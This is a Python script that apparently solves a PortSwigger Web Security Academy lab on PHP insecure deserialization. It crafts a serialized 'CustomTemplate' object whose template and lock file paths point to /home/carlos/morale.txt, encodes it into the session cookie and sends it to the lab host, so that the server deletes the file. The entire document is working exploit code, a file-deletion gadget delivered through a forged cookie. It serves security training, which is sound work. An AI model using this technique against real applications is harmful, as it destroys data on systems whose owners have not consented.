import base64
import http.client
import ssl
import urllib.parse

LAB_ID = "???"


def GET_(session: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}'
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


file_to_remove = f"/home/carlos/morale.txt"
object_name = "CustomTemplate"
fields = {
    "template_file_path": file_to_remove,
    "lock_file_path": file_to_remove,
}
session = (f'O:{len(object_name)}:"{object_name}":{len(fields)}:{{' +
            "".join([f's:{len(name)}:"{name}";s:{len(value)}:"{value}";' for name, value in fields.items()])+
            f'}}')
print(f"crafted session: {session}")
session_encoded = urllib.parse.quote(base64.b64encode(session.encode('utf-8')).decode('utf-8'))
print(f"crafted session encoded: {session_encoded}")

response = GET_(session=session_encoded)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode())
